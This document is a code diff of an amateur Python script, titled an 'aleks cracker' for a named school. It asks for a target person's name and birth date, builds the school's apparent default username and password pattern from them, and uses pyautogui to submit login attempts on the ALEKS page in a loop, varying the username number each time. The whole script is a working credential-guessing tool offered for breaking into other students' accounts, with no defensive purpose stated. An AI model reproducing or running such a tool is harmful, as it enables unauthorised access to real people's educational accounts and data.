@@ -2,119 +2,321 @@ import time
 import os
 import pyautogui
 from pynput import keyboard
+import random
+from colorama import Fore
+
+# this is for filtering dates
+def date(string):
+    return string.replace(",", "")
+
+
 
 
 #pyautogui.moveTo(100,100,duration=0.5)
 
-#this is a bad script wich has more printing than script
-print()
+# this is a bad script wich has more printing than script
+
+#  my bad ui
+print("---------------------------------------------------")
 print("aleks cracker for woodland mid 2021-2022 by RafiDEV")
-print()
-print("type the persons first name all caps")
-name1 = input(": ")
+print("----------------------------------------------------")
+print("-------------------")
+print("0 | exit")
+print("--|----------------")
+print("1 | simple")
+print("--|----------------")
+print("2 | randomized (not working for now)")
+print("-------------------")
+guy = input(": ")
 
-print("type the persons last name all caps")
-name2 = input(": ")
+#this cheks what the thing is u put is in the menue
 
-print("type the persons birth day: MMDDYYYY no commas spaces ect")
-bday = input(": ")
-# the had math at work
+if guy == "hecker":
+    while True:
 
-Sname1 = name1[:1]
-pw = bday + "W"
-Uname = Sname1 + name2
+        a = random.randint(0,130)
+        b = random.randint(0,104)
+        d = random.randint(0,1900)
 
-print()
-print("the user name might be:")
+        print(Fore.GREEN + str(d) + "  " + str(a) + "  " + str(b) + "  " + str(a) + "  " + str(b) + "  " + str(a))
+        #time.sleep(0.001)
 
-print(Sname1 + name2 + "(random number)")
+if guy == "2":
+    def spam():
+        pyautogui.moveTo(ppw)
+        pyautogui.click()
 
-print()
-print("the pasword is: " + pw)
+        # the date(str) is the thing for filtering the carictors in this case comas
+        pyautogui.write(date(pw))
 
-print("move your mouse over the login button in aleks login page")
-input("press enter to continue")
-print("5")
-time.sleep(1)
+        pyautogui.moveTo(user)
+        pyautogui.click()
+        pyautogui.write(Uname + str(n))
 
-print("4")
-time.sleep(1)
+        pyautogui.moveTo(login)
+        pyautogui.click()
+        time.sleep(0.2)
+        pyautogui.click()
 
-print("3")
-time.sleep(1)
-
-print("2")
-time.sleep(1)
-
-print("1")
-time.sleep(1)
-
-
-login = pyautogui.position()
-print("your maouse is at: ")
-print(pyautogui.position())
+        time.sleep(2)
 
 
-print("move your mouse over the username text box in aleks login page")
-input("press enter to continue")
-print("5")
-time.sleep(1)
-
-print("4")
-time.sleep(1)
-
-print("3")
-time.sleep(1)
-
-print("2")
-time.sleep(1)
-
-print("1")
-time.sleep(1)
 
 
-user = pyautogui.position()
-print("your maouse is at: ")
-print(pyautogui.position())
+    print("type the first name or first initial")
+    name1 = input(": ")
+    print("type the persons last name")
 
-print("move your mouse over the password text box in aleks login page")
-input("press enter to continue")
-print("5")
-time.sleep(1)
+    name2 = input(": ")
 
-print("4")
-time.sleep(1)
+    print("type the persons birth day: MM,DD,YYYY")
+    bday = input(": ")
 
-print("3")
-time.sleep(1)
+    print("type a number, numbers smaller then it will be typed")
+    num = input(": ")
 
-print("2")
-time.sleep(1)
+    # the hard math at work
 
-print("1")
-time.sleep(1)
+    Sname1 = name1[:1]
+    pw = bday + "W"
 
 
-ppw = pyautogui.position()
-print("your maouse is at: ")
-print(pyautogui.position())
+    Uname = Sname1 + name2
+    Uname = str.upper(Uname)
 
-#the spaming
-n = 0
-while True:
-    n = n + 1
-    pyautogui.moveTo(ppw)
-    pyautogui.click()
-    pyautogui.write(pw)
+    # this shows the stuff that will be riten
+    print()
+    print("the user name might be:")
 
-    pyautogui.moveTo(user)
-    pyautogui.click()
-    pyautogui.write(Uname + str(n))
+    print(Uname + "(random number)")
 
-    pyautogui.moveTo(login)
-    pyautogui.click()
-    time.sleep(0.2)
-    pyautogui.click()
+    print()
+    print("the pasword is: " + date(pw))
 
-    time.sleep(3)
+    #   this is for calabrating
+
+    print("move your mouse over the login button in aleks login page")
+    input("press enter to continue")
+    print("5")
+    time.sleep(1)
+
+    print("4")
+    time.sleep(1)
+
+    print("3")
+    time.sleep(1)
+
+    print("2")
+    time.sleep(1)
+
+    print("1")
+    time.sleep(1)
+
+
+    login = pyautogui.position()
+    print("your maouse is at: ")
+    print(pyautogui.position())
+
+
+    print("move your mouse over the username text box in aleks login page")
+    input("press enter to continue")
+    print("5")
+    time.sleep(1)
+
+    print("4")
+    time.sleep(1)
+
+    print("3")
+    time.sleep(1)
+
+    print("2")
+    time.sleep(1)
+
+    print("1")
+    time.sleep(1)
+
+
+    user = pyautogui.position()
+    print("your maouse is at: ")
+    print(pyautogui.position())
+
+    print("move your mouse over the password text box in aleks login page")
+    input("press enter to continue")
+    print("5")
+    time.sleep(1)
+
+    print("4")
+    time.sleep(1)
+
+    print("3")
+    time.sleep(1)
+
+    print("2")
+    time.sleep(1)
+
+    print("1")
+    time.sleep(1)
+
+
+    ppw = pyautogui.position()
+    print("your maouse is at: ")
+    print(pyautogui.position())
+
+    print("to stop press ^C")
+
+   
+    oldNum = []
+    while True:
+
+        # more hard math
+
+        n = random.randint(1, int(num))
+
+        if  not set(oldNum) == n:
+            
+            oldNum.append(n)
+            pyautogui.moveTo(ppw)
+            pyautogui.click()
+
+            # the date(str) is the thing for filtering the carictors in this case comas
+            pyautogui.write(date(pw))
+
+            pyautogui.moveTo(user)
+            pyautogui.click()
+            pyautogui.write(Uname + str(n))
+
+            pyautogui.moveTo(login)
+            pyautogui.click()
+            time.sleep(0.2)
+            pyautogui.click()
+
+            time.sleep(2)
+            print(oldNum)
+
+if guy == "0":
+    exit()
+
+if guy == "1":
+    print("type the first name or first initial")
+    name1 = input(": ")
+    print("type the persons last name")
+
+    name2 = input(": ")
+
+    print("type the persons birth day: MM,DD,YYYY")
+    bday = input(": ")
+
+    # the had math at work
+
+    Sname1 = name1[:1]
+    pw = bday + "W"
+
+    Uname = Sname1 + name2
+    Uname = str.upper(Uname)
+
+    # this shows the stuff that will be riten
+    print()
+    print("the user name might be:")
+
+    print(Uname + "(random number)")
+
+    print()
+    print("the pasword is: " + date(pw))
+
+    #   this is for calabrating
+
+    print("move your mouse over the login button in aleks login page")
+    input("press enter to continue")
+    print("5")
+    time.sleep(1)
+
+    print("4")
+    time.sleep(1)
+
+    print("3")
+    time.sleep(1)
+
+    print("2")
+    time.sleep(1)
+
+    print("1")
+    time.sleep(1)
+
+
+    login = pyautogui.position()
+    print("your maouse is at: ")
+    print(pyautogui.position())
+
+
+    print("move your mouse over the username text box in aleks login page")
+    input("press enter to continue")
+    print("5")
+    time.sleep(1)
+
+    print("4")
+    time.sleep(1)
+
+    print("3")
+    time.sleep(1)
+
+    print("2")
+    time.sleep(1)
+
+    print("1")
+    time.sleep(1)
+
+
+    user = pyautogui.position()
+    print("your maouse is at: ")
+    print(pyautogui.position())
+
+    print("move your mouse over the password text box in aleks login page")
+    input("press enter to continue")
+    print("5")
+    time.sleep(1)
+
+    print("4")
+    time.sleep(1)
+
+    print("3")
+    time.sleep(1)
+
+    print("2")
+    time.sleep(1)
+
+    print("1")
+    time.sleep(1)
+
+
+    ppw = pyautogui.position()
+    print("your maouse is at: ")
+    print(pyautogui.position())
+
+    print("to stop press ^C")
+
+    #the spaming
+    n = 0
+    while True:
+        n = n + 1
+        pyautogui.moveTo(ppw)
+        pyautogui.click()
+
+        # the date(str) is the thing for filtering the carictors in this case comas
+        pyautogui.write(date(pw))
+
+        pyautogui.moveTo(user)
+        pyautogui.click()
+        pyautogui.write(Uname + str(n))
+
+        pyautogui.moveTo(login)
+        pyautogui.click()
+        time.sleep(0.2)
+        pyautogui.click()
+
+        time.sleep(2)
+        #print("you have the script typed " + n + " times              to stop press ^C")   
+
+
+
+
 
